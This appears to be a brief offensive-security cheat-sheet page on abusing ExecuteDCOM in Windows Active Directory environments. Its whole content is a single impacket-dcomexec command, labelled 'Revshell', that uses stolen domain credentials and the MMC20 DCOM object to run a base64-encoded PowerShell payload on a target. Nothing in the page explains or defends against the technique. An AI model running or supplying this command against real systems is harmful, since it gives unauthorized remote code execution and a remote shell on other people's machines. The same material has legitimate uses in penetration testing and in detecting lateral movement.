---
title: "ExecuteDCOM"
date: 2024-8-3
tags: ["Executedcom", "Active Driectory", "Windows", "RCE"]
---

### Abuse #1: ExecuteDCOM

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Revshell
impacket-dcomexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' '<POWERSHELL_3_BASE64>' -silentcommand -object MMC20
```

{{< /tabcontent >}}
